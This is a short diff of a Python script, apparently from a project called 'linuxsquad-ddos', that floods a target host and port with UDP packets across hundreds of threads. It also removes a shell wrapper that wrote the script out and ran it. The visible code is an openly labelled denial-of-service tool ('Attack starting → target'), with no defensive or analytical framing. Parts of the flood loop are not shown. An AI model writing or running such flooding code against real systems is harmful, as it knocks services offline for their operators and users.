@@ -1,8 +1,3 @@
-cd \~/linuxsquad-ddos
-
-rm -f ddos.py
-
-cat > ddos.py << 'EOF'
 import sys
 import socket
 import threading
@@ -26,7 +21,7 @@ port = int(sys.argv[2])
 threads = int(sys.argv[3]) if len(sys.argv) > 3 else 600
 
 print(f"\033[91m[+] Attack starting → {target}:{port}\033[0m")
-print(f"\033[92m[+] {threads} threads running... Press Ctrl+C to stop.\033[0m")
+print(f"\033[92m[+] {threads} threads running... (Ctrl+C to stop)\033[0m")
 
 def flood():
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -46,7 +41,3 @@ try:
         time.sleep(5)
 except KeyboardInterrupt:
     print("\n\033[91m[-] Attack stopped.\033[0m")
-EOF
-
-echo "[+] Script updated."
-python ddos.py
